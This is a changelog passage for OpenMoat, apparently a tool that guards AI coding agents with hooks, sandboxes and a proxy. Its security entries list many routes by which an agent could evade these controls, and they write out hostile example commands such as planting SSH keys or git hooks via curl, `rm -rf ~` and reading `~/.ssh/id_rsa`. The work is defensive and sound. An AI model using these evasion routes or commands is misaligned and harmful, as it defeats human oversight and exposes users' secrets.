- A mail address or login in the option that takes it (`git -c user.email=…`, `curl -u`, `--mail-from`, `--mail-rcpt`, and a `curl -d`, `-F` or `-H` value ending in an address) is no longer read as a host the command connects to, so a `net` default no longer denies an ordinary push or API call over it. A mail address in a string of interpreter code (`python3 -c`, a here-document) only looks like a host: `net` rules naming its domain still match, the `net` default does not. `ssh me@host`, `curl me@host` and a `git -c` proxy or remote URL are still hosts ([#638](https://github.com/crocodile-labs/openmoat/pull/638)).
- `openmoat sandbox sync` lists Codex's nested-`.git` allowance once when several allowed directories need it ([#638](https://github.com/crocodile-labs/openmoat/pull/638)).
- docs/INSTALL.md: on macOS 12 and earlier, where Homebrew may ask for a newer Xcode, install with the shell installer or `cargo install` ([#638](https://github.com/crocodile-labs/openmoat/pull/638)).
- The README, INSTALL, USAGE, SANDBOX and ARCHITECTURE docs are corrected and completed for 0.9.0 ([#652](https://github.com/crocodile-labs/openmoat/pull/652)).
- `openmoat bench` waits 45 s for a hook call, past `openmoat guard`'s own 30 s budget, instead of 10 s, so a guard that is only slow on a loaded machine is no longer killed and scored `error`; a step scored `error` now says why (exit code, start of stdout and stderr, time-out or start failure) ([#655](https://github.com/crocodile-labs/openmoat/pull/655)).

## [0.9.0] - 2026-10-22

**Upgrading:** run `openmoat init` once after upgrading and restart your agents. An agent keeps the hook command it read when it started, and an OpenMoat binary older than 0.9.0 denies every call over a lock 0.9.0 has written. Keep one OpenMoat installed (docs/INSTALL.md, Upgrading). Several changes below are marked **breaking**: MCP tools are held once, session grants from earlier releases need approving again, repository policies and packs must be signed again in their new namespaces, and a host allowed without a port is reached on 443 and 80 only.

### Security
- The command line `flock -c`/`--command` runs, and the commands of launchers that start their arguments (`taskset`, `chrt`, `numactl`, `unshare`, `nsenter`, `prlimit`, `setpriv`, `chpst`, `cgexec`, `firejail`, `sandbox-exec`, `arch`, `strace`, `ltrace`, `valgrind`, `catchsegv`, `gdb --args`, `faketime`, `torsocks`, `proxychains`, `systemd-inhibit`, `busybox`, `toybox`), are decided as commands of their own, so a secret read, a hook-settings write or `rm -rf ~` inside one is denied as it is on its own ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only `openmoat` commands are also denied when `systemd-run`, `daemonize`, `start-stop-daemon`, `launchctl submit` or an `at` or `batch` job starts them; `at` and `batch` ask like `crontab` (`persistence`), and the job they read from stdin is decided as a command line ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Renaming or removing a repository's `.github` or `.github/copilot` folder is denied (`agent-folders`, hook only), and the same for `.github/hooks`, `.pi` and `.pi/extensions` asks (`runs-later`): a rename away and back edited the Copilot settings, hooks or pi files inside under another name. This also denies an agent's `mkdir .github` or `rm -r .github`; writing files inside `.github` is unchanged ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Stopping, disabling, masking or killing the proxy service (`systemctl --user stop moat-proxy`, `launchctl bootout …/dev.openmoat.proxy`, and the like) is denied like `openmoat proxy uninstall` (`kernel-self`), and `pkill` or `killall` naming `moat` asks (`stops-openmoat`) ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `ln` options are read as `ln` reads them: `ln -S -s`, `ln -t -s` and an `-s` after the first operand (`ln SRC DIR -s`, a file to BSD `ln`) make hard links, decided as a write of the linked file ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Copies, moves and links by the GNU tools installed with a `g` in front (`gcp`, `gmv`, `gln`, `grm`, …), by `busybox` and `toybox` applets, macOS `ditto`, `pax -rw` and `cpio` are decided as writes of what they write, as `cp`, `mv` and `ln` are ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A person-only `openmoat` command run through a link under another name, or a name on the search path, that reaches the binary the policy lock records is denied by `kernel-self` like `openmoat` itself, and so is any spelling of `openmoat` in another case where file names ignore case (`OpenMoat allow` on macOS and Windows) ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only commands also refuse to run when started under a name other than `openmoat` or `moat`, check the lock in `~/.moat` as well as the one `MOAT_HOME` names, and refuse when a lock exists but cannot be read; a link to `openmoat` under another name no longer runs them ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat mcp accept` shows a server's tool names, titles and descriptions with escape sequences and bidirectional characters replaced by `?`, so a tool cannot redraw the changes you are asked to accept ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The text OpenMoat prints from agents, repositories and servers (the `openmoat trust` and `openmoat allow --last` questions included) shows invisible bidirectional and zero-width characters (U+202E, U+2066, U+200B, U+FEFF, …) as `?`, so a rule cannot be shown in another order than it is read ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat mcp proxy` holds a tool listed twice under one name when any of its entries differs from the accepted pin, whatever their order; drops a listed tool whose `name` is not a string; and pins every field of a tool besides the named ones (`_meta`, `icons`, `execution`, …), so a tool that has such fields is held once after upgrading ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A `net` or `fetch` allow written `host:port` (`*:8443`) no longer also matches a host without a port, so it opens no IPv6 address whose text ends in `:8443` in the hook or on ports 443 and 80 in the proxy ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A `plain_http: true` secret is no longer handed to Claude Code's own broker, which injected it on every port of its host, and OpenMoat no longer sets Claude Code's `allowPlaintextInject`: such a secret goes through `openmoat proxy` only, on its one port. Inside Claude Code's sandbox it works only while `sandbox.proxy_port` routes traffic through `openmoat proxy` ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Repository policy signatures are made and checked in their own namespace, `openmoat-repo-policy`: a pack signed in `openmoat-policy` by an earlier release is no longer a signed repository policy. This breaks every repository policy signature made before: sign the file again with `ssh-keygen -Y sign -n openmoat-repo-policy`, and run `openmoat policy trust-key` again for each key trusted before ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A change to Claude Code's `autoMode` settings, whose rules decide which calls its auto mode runs unasked, is drift that denies every call until `openmoat doctor --accept`, instead of being decided through ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` keeps commands from renaming away the folders that hold an agent's configuration directly in the project (`.github`, `.pi`, `.openclaw`), which carried a hook written under the other name back past the protection: on macOS they cannot be created, renamed or removed under `openmoat run` (create a missing `.github` outside it), and on Linux each existing one is bound onto itself, with the network namespace and with `--isolate` ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux, where the agent gets a network namespace, also makes the agents' hook settings that exist directly in the project read-only for the session (`.claude/settings.json`, `.claude/settings.local.json`, `.cursor/hooks.json`, `.codex/hooks.json`, `.gemini/settings.json`, `.github/copilot/settings.json`, `.copilot/hooks/`), as on macOS; an agent inside can no longer save its own changes to them there ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on macOS denies a file or folder created in another case than a deny rule names (`.MCP.json`, `.Claude`), which on a case-insensitive disk is the file the agent loads ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux without a network namespace also refuses a `--write` path inside a tree `kernel-self` protects whole (`~/.codex/sessions`) and every `--write` path outside the project, which can hold another repository's hook settings. This breaks `--write` outside the project there, `~/.claude/projects` included: install bubblewrap and allow unprivileged user namespaces ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat run` on Linux refuses `setns` (joining an existing namespace), as it refuses creating one; `nsenter` and a container runtime's `exec` fail inside ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A tool OpenMoat does not map is checked for what its arguments name, for every host that hands it to OpenMoat (pi, OpenClaw, Gemini CLI, Cursor, GitHub Copilot CLI): every path and URL, by key or by its look at any depth, and every shell command under a key such as `command`, `cmd` or `script`. A pi extension's tool reading `~/.ssh/id_rsa` ran unchecked before, since pi runs a call OpenMoat makes no decision on; now it is denied. A tool whose arguments name a host to contact is denied by the `net` default unless the host is allowed, and arguments nested deeper than 8 levels deny the call ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Gemini CLI's `run_shell_command` `dir_path` and OpenClaw's `exec` `workdir` no longer decide which directory is the project: the command is checked after a `cd` there, and the project stays the session's. A command writing a launch agent with `dir_path` in `~/Library/LaunchAgents` was allowed as a write in its own project ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- GitHub Copilot CLI's `write_bash` and `write_powershell` ask (new rule `unchecked`): the shell joins typed input to what came before, so a command split over two calls passed piece by piece. A `bash` command that leaves Copilot's shell, which later calls reuse, in a directory OpenMoat cannot know (`cd "$X"`, `popd`, `eval`) asks too ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Gemini CLI's `grep_search` and `glob` without `dir_path`, and every `read_many_files`, ask (`unchecked`): Gemini CLI then searches every workspace directory, and the hook names only the working directory. `grep_search`'s `include_pattern` (and the older `include`) is checked for where it climbs to. This adds a Gemini CLI confirmation for such searches ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- A glob pattern whose brace or bracket group holds a separator, a `..` or another brace group (`{x/../..,y}`) asks (`unchecked`) in Claude Code's `Glob`, Gemini CLI's `glob` and `read_many_files`, pi's `find` and Copilot CLI's `glob`: it may climb further than OpenMoat works out ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- Writes to Gemini CLI's policy files (`.gemini/policies/`, `~/.gemini/policies/`), custom commands (`.gemini/commands/`) and subagents (`.gemini/agents/`), a repository's Copilot CLI agents (`.github/agents/`) and Claude Code's subagents, skills and slash commands (`.claude/agents/`, `.claude/skills/`, `.claude/commands/`) ask (`runs-later`), in a project too, and after untrusted content session taint protects `.github/agents/`. Writing a project's Claude Code skill or command, allowed before, now asks ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- The person-only `openmoat` commands are also denied under `setsid` and `flock`, and `openmoat proxy install` and `openmoat proxy uninstall` are person-only like `uninstall`: a service installed or removed changes every later session ([#626](https://github.com/crocodile-labs/openmoat/pull/626)).
- The person-only commands (all but `openmoat init`) refuse to run from an executable other than the `openmoat` the policy lock records or its `moat` alias: a copy of the binary under another name, started where the agent is no longer among its parent processes, got past the guard's check by name. Run them from the installed `openmoat`, or run `openmoat init` from the new binary to point the hooks at it ([#626](https://github.com/crocodile-labs/openmoat/pull/626)).
- A search tool's glob pattern whose `..` segments climb out of the directory it searches, also after a wildcard (`*/../..`, `{..,x}`), is checked against the directory it reaches: Claude Code's `Glob`, Gemini CLI's `glob` and `read_many_files`, pi's `find` and Copilot CLI's `glob`; a deny on reading that directory holds ([#625](https://github.com/crocodile-labs/openmoat/pull/625)).
- Claude Code's `Artifact` and `ArtifactData` tools are checked: every local file they upload to a claude.ai page is a read, like `SendFile`'s, and each file `Artifact` saves with `out_dir` is a write; `openmoat init` adds them to the hook's matcher ([#625](https://github.com/crocodile-labs/openmoat/pull/625)).
- `openmoat proxy` and `openmoat run`'s proxy count ports: a host allowed by a pattern without a port is reached on 443 and 80 only, and any other port is refused (`proxy-port`) unless a `net` or `fetch` rule names it as `host:port` (`example.com:8443`). This breaks connections to other ports that worked before, `defaults: { net: allow }` included: add a `host:port` rule for each ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run`'s proxy also refuses the hosts the project's repository policy denies; the repository's allow and ask rules are still not used there ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- A brokered secret with `plain_http: true` is injected into plain-HTTP requests to port 80 only, or to the port its new `port` field names; a request to another port of the host keeps the placeholder. A secret on another port stops being injected until its entry sets `port` ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- In `openmoat run`, a connection opened before the session read secret material is closed within about a second once the session's taint refuses its host ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- The proxy resolves names as fully qualified (`name.`), so the resolver tries no search domain first; on Windows names are resolved as before. A single-label name that resolved only through a search domain no longer resolves ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- On Linux, `openmoat run`'s seccomp filter refuses `sendto`, `sendmsg` and `sendmmsg` with `MSG_FASTOPEN` (`EPERM`): TCP Fast Open connects without the `connect()` Landlock's port rule checks. A program that asks for TCP Fast Open gets an error ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- A private address an allow list excludes (`!10.0.0.9`) is no longer opened by the list's other address patterns when a name resolves to it ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run` on macOS denies its commands writing an agent's own configuration in the project (`.claude/hooks/`, `.mcp.json`, `.cursor/mcp.json`, `.codex/config.toml`, `.github/hooks/`, `.github/mcp.json`, `.openclaw/extensions/`, `.pi/extensions/`, `.pi/mcp.json`, `.pi/settings.json`), which the agent loads later outside the sandbox, also inside a `--write` path; on Linux, where the agent gets a network namespace, the ones that exist directly in the project are read-only for the session. This also refuses such a write that the hook asked about and you allowed: change these files outside `openmoat run`. CI files and commit-hook managers' files stay writable ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` lets commands open only `/dev/tty` and the terminal it was started on, no longer every terminal of yours (`/dev/ttys*` on macOS, `/dev/pts/*` on Linux), so a script cannot read or write your other terminals. A program that opens a new pseudo-terminal inside (`script`, `expect`, `node-pty`) can now fail there ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` on Linux refuses the kernel keyrings (`keyctl`, `add_key`, `request_key`) and new namespaces (`unshare`, `clone` with a namespace flag; `clone3` answers `ENOSYS`, so the C library falls back to `clone`). Containers, bubblewrap and Chromium's own sandbox no longer start inside ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat run` on Linux without a network namespace refuses to start when a `--write` path holds what `kernel-self` protects (OpenMoat's state, an agent's hook settings), naming the paths; it only warned before. This breaks `openmoat run --write ~/.claude` on Linux without bubblewrap: install bubblewrap and allow unprivileged user namespaces, or grant narrower paths ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `rename`, `prename`, `perl-rename` and `file-rename` write every path they name, so renaming an agent's directory with them is denied (`kernel-self`) like `mv .claude x` and `mv x .claude`. Claude Code's generated settings add the `Edit(./.cursor/hooks.json)`-style rules on every OS, so on macOS its sandbox keeps the working directory's `.cursor`, `.codex`, `.copilot` and `.gemini` from being moved away and replaced by a command ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Claude Code's generated settings on Linux hide OpenMoat's state directory whole from sandboxed commands: its sandbox skips a read deny that is missing when a command starts, so the audit log's `-wal` and `-shm` files made while the command ran stayed readable. A `MOAT_HOME` outside the home is now hidden there, its policy included ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat mcp proxy` also pins each tool's title, output schema and annotations (`readOnlyHint`, `destructiveHint`), so a change to any of them holds the tool. After upgrading, every tool it pinned before is held once, even unchanged; `openmoat status` and `openmoat doctor` say so, and one `openmoat mcp accept` pins them again ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- A session grant for a command from `openmoat allow` applies only in the project it was approved in (the repository root, else the working directory); `openmoat allow "<command>" --session …` binds it to the current directory's project or `--project <dir>`. Command grants made by an earlier release stop applying, and `openmoat status` and `openmoat allowed` list them for approving again ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat trust` shows the repository policy's path, digest and rules first and asks `Trust this file? [y/N]`; without a yes it trusts nothing ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- A change of Claude Code's `permissions.defaultMode` to a mode that runs calls without asking (`acceptEdits`, `auto`, `bypassPermissions`, or any value other than `default`, `plan` and `dontAsk`) and any change to `permissions.additionalDirectories` are drift that denies every call until `openmoat doctor --accept`, instead of being decided through ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Making a hard link is decided as a write of the file it links to (`ln` without `-s`, `link`, `cp -l`/`--link`, `rsync --link-dest`), so a hard link to OpenMoat's state or an agent's hook settings is denied by `kernel-self` ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- Policy packs are signed in their own namespace, `openmoat-pack`, so a signed pack is never accepted as a signed repository policy, or the reverse. This breaks installing a pack signed in `openmoat-policy`: sign it again with `ssh-keygen -Y sign -n openmoat-pack`, and run `openmoat policy trust-key` again for a key trusted before; installed packs and repository policy signatures keep working ([#630](https://github.com/crocodile-labs/openmoat/pull/630)).
- `openmoat proxy` refuses a connection that reaches this machine through one of its other addresses (its LAN or public IPv4 or IPv6 address, where services listening on every interface answer as on loopback); it is closed before a byte is sent (`proxy-address`) ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` checks an IPv4-translated address (`::ffff:0:a.b.c.d`) as the IPv4 address it reaches, as it does NAT64 and IPv4-compatible ones, so `::ffff:0:a9fe:a9fe` is refused as link-local ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` refuses a plain-HTTP `Content-Length` over 2^31 - 1 (chunk sizes already were), a `Transfer_Encoding` or `Content_Length` header (servers that pass headers on as CGI-style variables read it as the framing header), and a port with a sign (`:+80`) in the target or `Host` ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat proxy` no longer puts a brokered secret into a plain-HTTP `TRACE` or `TRACK`, whose answer would echo it to the agent ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A plain-HTTP request whose chunked body turns malformed after the head is now recorded when the proxy cuts it, not only by its earlier `allow` row ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- The push check of `openmoat guard` runs the `git` the search-path snapshot `openmoat init` recorded, by its absolute path, instead of the first `git` on the hook's own `PATH`: a relative entry there (`.`, `node_modules/.bin`) named a directory of the repository being pushed, and a `git` placed in it ran outside every sandbox. Without such a `git` the push asks (`push-unchecked`). The `ssh-keygen` that checks a signed repository policy and policy packs, and the `git` of `openmoat audit anchor`, are likewise never taken from a relative entry of the recorded search path, where one planted in the project could pass any signature ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- Audit redaction masks the whole quoted value of a named credential, spaces included (`DB_PASSWORD="a b c"`, `--password 'a b c'`, `-u "user:pass word"`); only its first word was masked before ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat mcp proxy` filters every response that lists tools, whatever its id: a server that answered a `tools/list` under another spelling of the request's id (`"2"` for `2`) had its changed or new tools shown to the agent ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat mcp proxy` no longer passes on a message from the agent host that it cannot read as JSON (a lone surrogate, an out-of-range number), which the server's own parser might read as a tool call; it answers with a parse error ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat init` over an existing policy lock without a person at a terminal (an `openmoat init --yes` detached from the agent) no longer changes what the lock trusts: it refuses to point the hooks at a binary other than the one the lock records, and keeps each agent's recorded configuration directory (`hosts.json`, which decides the MCP files the guard reads) and the search-path snapshot (`environment.json`) instead of taking them from its own environment ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A state file missing when the lock is re-pinned (`trust.json` before the first `openmoat trust`, or `approvals.json`, `policy.d/approved.yaml`, `hosts.json` or `environment.json` after a person accepted their deletion) is pinned as missing: one that appears there later is drift and denies every call (`kernel-integrity`), where the guard read it from disk unpinned, so a planted `approvals.json` or `approved.yaml` could allow calls ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- `openmoat run` on Linux, where it gives the agent a network namespace, also covers each existing file or directory a deny rule names inside a read root or a `--write` path, as `--isolate` does (hidden, or read-only for a write deny): with `--write ~/.claude` a command could rewrite `~/.claude/settings.json` and turn OpenMoat's hooks off for later sessions, and a read root's `~/.cargo/credentials.toml` was readable. Without a namespace, `openmoat run` names these paths on every start ([#619](https://github.com/crocodile-labs/openmoat/pull/619)).
- A `curl` or `wget` decided as a fetch (ADR-035) has every file it writes checked: a clustered or attached output (`curl -sSo .git/hooks/pre-commit`, `-oFILE`, `wget -qO FILE`) was not seen as a write, `--output-dir` and `wget -P` were not joined to the name, and `curl -O` and a plain `wget` wrote the URL's file name unchecked. These are `fs.write`s now for every `curl` and `wget`, so `curl -q -sSo .git/hooks/pre-commit https://x.test/h` asks and `curl -q --output-dir ~/.ssh -o authorized_keys https://x.test/k` is denied ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `curl -w`/`--write-out` (whose `%output{FILE}` writes to a file since curl 8.3), `-J`/`--remote-header-name` and `wget --content-disposition` (the server names the file), and `-O` of a URL with no plain file name keep a `curl` or `wget` `net`, no longer a fetch ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A `curl` or `wget` is a fetch only when it reads no configuration file of its own, which could add a body or an upload to the call: `curl` with `-q` (or `--disable`) as its first argument, `wget` with `--no-config --no-netrc`. A plain `curl https://docs.rs/serde` is `net` again and denied for an unlisted host; `curl -q https://docs.rs/serde` defers. `shell-rc` also denies writing `~/.curlrc`, `~/_curlrc`, `~/.config/curlrc`, `~/.wgetrc` and `~/.config/wget/`; existing policies get it with `openmoat policy upgrade` ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat init` over an existing policy lock, without a person at a terminal (an `openmoat init --yes` a build script detached from the agent, which the parent-process check cannot see), no longer pins new or changed MCP server definitions: it lists them and leaves them for `openmoat mcp accept`, so a server a cloned project planted in `.mcp.json` stays denied (`mcp-server-changed`). An unreadable lock is now refused without a terminal like a drifted one, pointing at `openmoat doctor --accept`; a first install and a person's `init` are unchanged ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- The person-only commands also refuse when the Continue CLI (`cn`), GitHub Copilot CLI (`copilot`), Gemini CLI (`gemini`) or, on macOS, a Cursor editor helper process (`Cursor Helper`, `Cursor Helper (Plugin)`, …) is among their parent processes. Cursor's editor agent runs commands in the same process tree as the editor's own terminals, so on macOS those commands now refuse in a Cursor terminal too: run them in a terminal of your own ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat run --isolate` on Linux drops bubblewrap's `--disable-userns` only when bubblewrap does not know the option (before 0.8); any other failure with it refuses instead of starting the agent able to create user namespaces of its own ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A Claude Code `ConfigChange` for a project's `.claude/settings.json` or `settings.local.json` is also blocked (`project-settings`) when it sets `enableAllProjectMcpServers`, `enabledMcpjsonServers` (Claude Code starts those servers, which runs their commands) or `extraKnownMarketplaces`, or when the file's bytes change between the check and the decision; `openmoat doctor` and `openmoat status` warn about the new keys too ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- Inline interpreter code that reads the environment through `getattr(os, 'environ')`, `vars(os)`, `os.__dict__`, `env` or `printenv` run as a child (`os.popen('env')`, `subprocess.run(['printenv', 'X'])`), PowerShell's `[Environment]::GetEnvironmentVariable('X')` and `GetEnvironmentVariables()`, its `Env:` drive (`Get-ChildItem Env:`, `gci`, `ls`, `dir env:`) or `$Env:X` in any case is now an `env.read` of the variable it names (`env-secrets`) or the whole environment (`env-dump`) ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- A write of a repository's `.github/mcp.json`, whose servers GitHub Copilot CLI starts in a trusted folder, asks (`runs-later`) and taints like the other agent configuration files ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).

### Added
- `openmoat-hosts` (library API): `HostSpec::BASE` and `InstallSpec::BASE`, the defaults a host spec takes for the fields it does not name, so a new optional field is added once rather than in every host; `Host::EVERY`, every host including those that speak another's format ([#631](https://github.com/crocodile-labs/openmoat/pull/631)).
- Connections the proxy refuses at accept for capacity (`503`) are recorded as `proxy-capacity` rows: the first at once, then one row per 10 seconds with the count ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat policy lint` warns about a `net` or `fetch` pattern whose port is not one (`example.com:*`, `example.com:0`, `[::1]:8443`), which matches nothing ([#627](https://github.com/crocodile-labs/openmoat/pull/627)).
- `openmoat run --netns=require` refuses to start on Linux where the agent cannot get a network namespace of its own, instead of restricting its network by port only; the default, `--netns=auto`, is unchanged ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- `openmoat sandbox show` lists the `hook_only` deny groups (ADR-034), such as `build-credentials`, with their paths, as decided by the hook only and not in the OS sandbox (`hook_only` in `--format json`) ([#618](https://github.com/crocodile-labs/openmoat/pull/618)).
- GitHub Copilot CLI is a supported agent (`openmoat init --hosts copilot-cli`): OpenMoat's `preToolUse` hook goes into a file of its own, `~/.copilot/hooks/openmoat.json` (or `$COPILOT_HOME/hooks/`), pinned by the lock, and checks shell commands, typed shell input, file reads and writes, patches, searches, fetches and MCP calls; an `ask` is Copilot's own prompt. Copilot runs a call whose hook times out, so `openmoat init` sets `timeoutSec` to 600, far above the guard's own 30 s deadline. `kernel-self` denies the agent writes to `~/.copilot` itself, its hooks directory, `settings.json` and `config.json`, and a repository's `.github/copilot/settings*.json`, whose `disableAllHooks` would turn every hook off; writing a repository's `.github/hooks/*.json`, `~/.copilot/mcp-config.json`, plugins or custom agents asks (`runs-later`), and `openmoat doctor` and `openmoat status` warn about a repository that turns hooks off or carries hook files. No OS sandbox is configured for Copilot CLI; existing policies get the rules with `openmoat policy upgrade` ([#615](https://github.com/crocodile-labs/openmoat/pull/615)).
- pi (`@earendil-works/pi-coding-agent`) is a supported agent, hook only: `openmoat init --hosts pi` writes OpenMoat's extension to `~/.pi/agent/extensions/openmoat.js` (or under `PI_CODING_AGENT_DIR`) and pins it; its `tool_call` handler runs `openmoat guard --host pi` for every tool call, calls a `codemode` script makes included, blocks on a deny and on any failure or a guard that does not answer in 45 s, and asks in pi's own dialog (a deny in print and JSON mode). `kernel-self` denies the agent writes to the extension, pi's agent directory, `settings.json` and `trust.json`, and `runs-later` asks for other pi extensions, pi's `mcp.json` and a project's `.pi/extensions/`, `.pi/mcp.json` and `.pi/settings.json`; existing policies get these with `openmoat policy upgrade` ([#616](https://github.com/crocodile-labs/openmoat/pull/616)).
- Gemini CLI is a supported agent: `openmoat init` adds a `BeforeTool` hook to `~/.gemini/settings.json` (or `$GEMINI_CLI_HOME/.gemini`) that checks its shell, file, search, web and MCP tools, sends an `ask` as Gemini CLI's own confirmation, and is pinned by the lock; `kernel-self` denies the agent writing Gemini CLI's user and project `settings.json`, its `trustedFolders.json` and directory, and writing an extension asks (`runs-later`). When Gemini CLI saves a new model, theme, sign-in method or display setting in that file, `openmoat doctor` reports it and calls are still decided (the keys are listed in its `HostSpec`); any other change to it, a hook, `hooksConfig`, an MCP server or a `tools` setting among them, still denies every call until `openmoat doctor --accept`. Gemini CLI has no fail-closed setting, so a hook that times out lets the call run, and there is no OS sandbox from OpenMoat for it ([#617](https://github.com/crocodile-labs/openmoat/pull/617)).
- The MCP servers of GitHub Copilot CLI (`~/.copilot/mcp-config.json`, and a project's `.mcp.json` and `.github/mcp.json`, wrapped in `mcpServers` or bare) and of pi (`~/.pi/agent/mcp.json`, a project's `.pi/mcp.json`) are pinned like the other agents': a changed or new one holds back its own tool calls (`<server>-…` for Copilot, `mcp__<server>__…` as pi spells it) until `openmoat mcp accept`; `openmoat mcp wrap` handles Copilot's `local` servers ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `openmoat status` and `openmoat doctor` report an agent as not protected when its own settings turn OpenMoat's hook off: `disableAllHooks` in Claude Code's or Copilot's `settings.json`, `[features] hooks = false` in Codex's `config.toml`, `hooksConfig` in Gemini CLI's `settings.json`, an `extensions` entry in pi's `settings.json` that excludes OpenMoat's extension ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `openmoat status` and `openmoat doctor` warn about a project's Gemini CLI `.gemini/settings.json`, pi `.pi/settings.json` and `.pi/extensions/`, Codex `.codex/config.toml` and `.codex/hooks.json`, and Cursor `.cursor/hooks.json` that turn hooks off, add hooks or extensions, or start programs ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).
- `--help` of `openmoat init`, `uninstall`, `guard`, `bench`, `replay` and the audit commands lists every host id `--hosts`/`--host` takes, and the shell completes them ([#623](https://github.com/crocodile-labs/openmoat/pull/623)).

### Changed
- Adding an agent is one line in the host list (`crates/openmoat-hosts/src/host.rs`), which gives the `Host` variant, `Host::ALL`, `Host::EVERY`, the `--host` id list and the spec and adapter lookups; the README "Supported agents" table and the ARCHITECTURE "Host tool mapping" table are generated from each agent's spec and checked by `cargo test -p openmoat-hosts --test docs`, which also fails when an adapter matches a tool its rows leave out; `docs/ADDING_AN_AGENT.md` starts with the smallest path that fits an agent and lists every file a new one needs. `openmoat-hosts` (library API, breaking): `HostSpec` has a new public field `docs`, of the new types `HostDocs` and `ToolRow` ([#632](https://github.com/crocodile-labs/openmoat/pull/632)).
- **Breaking** for the library crates: `Action::UnknownTool` gains `reads`, `writes`, `hosts` and `commands`, `Action::McpTool` gains `commands`, and `Action::Unchecked` is new (`Action::unknown_tool` and `Action::unchecked` build them) ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat status` and `openmoat doctor` name every agent's directory variable (`COPILOT_HOME`, `PI_CODING_AGENT_DIR`, `GEMINI_CLI_HOME` and OpenClaw's included) when a pinned hook file is not this shell's ([#633](https://github.com/crocodile-labs/openmoat/pull/633)).
- `openmoat init` prints, after it writes or changes Codex's hook entry, that Codex runs it only once you trust it in `/hooks`; `openmoat doctor` says so on Codex's protection line. `openmoat-hosts` (library API, breaking): `InstallSpec::trust_step` ([#626](https://github.com/crocodile-labs/openmoat/pull/626)).
- `openmoat-hosts` (library API, breaking): `Host::CopilotCli`, `HookFormat::Copilot` and `ProjectSettingsSpec::hook_dir`; `Host::ALL` has one more host ([#615](https://github.com/crocodile-labs/openmoat/pull/615)).
- `openmoat-hosts` (library API, breaking): `Host::Pi`, `HookFormat::Pi`; `Host::ALL` has one more host ([#616](https://github.com/crocodile-labs/openmoat/pull/616)).
- `openmoat-hosts` (library API, breaking): `Host::GeminiCli`, `HookFormat::Gemini`, `InstallSpec::relaxed_keys` (`RelaxedKey`, `KeyShape`) and `InstallSpec::variable_names_home`; `Host::ALL` has one more host ([#617](https://github.com/crocodile-labs/openmoat/pull/617)).
